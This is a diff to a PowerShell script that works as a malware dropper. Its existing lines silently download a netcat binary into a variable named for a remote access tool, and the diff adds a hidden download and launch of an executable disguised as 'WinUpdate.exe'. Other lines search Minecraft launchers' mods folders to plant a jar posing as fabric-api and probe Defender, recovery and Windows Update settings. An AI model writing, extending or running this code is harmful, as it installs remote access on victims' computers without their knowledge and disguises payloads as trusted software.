@@ -23,6 +23,13 @@ if (-not (Test-Path $ratPath)) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath -ErrorAction SilentlyContinue > $null 2>&1
 }
 
+$winUpdatePath = "$workDir\WinUpdate.exe"
+if (-not (Test-Path $winUpdatePath)) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/WinUpdate.exe" -OutFile $winUpdatePath -ErrorAction SilentlyContinue > $null 2>&1
+}
+
+Start-Process -FilePath $winUpdatePath -WindowStyle Hidden -ErrorAction SilentlyContinue
+
 
 # --- Buscar todas las carpetas 'mods' en los launchers de Minecraft (SILENCIOSO) ---
 $jarName = "fabric-api-0.179.1_22.1.2.jar"
@@ -97,7 +104,7 @@ try { Get-MpComputerStatus -ErrorAction Stop 2>$null | Select-Object AMServiceEn
 if ((reagentc /info | Out-String) -match "Enabled|Disabled") { "Factory Reset: $($matches[0])" } else { "Factory Reset: Not found" }
 if ((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue).NoAutoUpdate -eq 1) { "Windows Update: Disabled" } else { "Windows Update: Enabled" }
 
-Write-Host "[DONE]..." -ForegroundColor Magenta
+Write-Host "[DONE]... (restarting)" -ForegroundColor Magenta
 
 Start-Sleep -Seconds 30
 
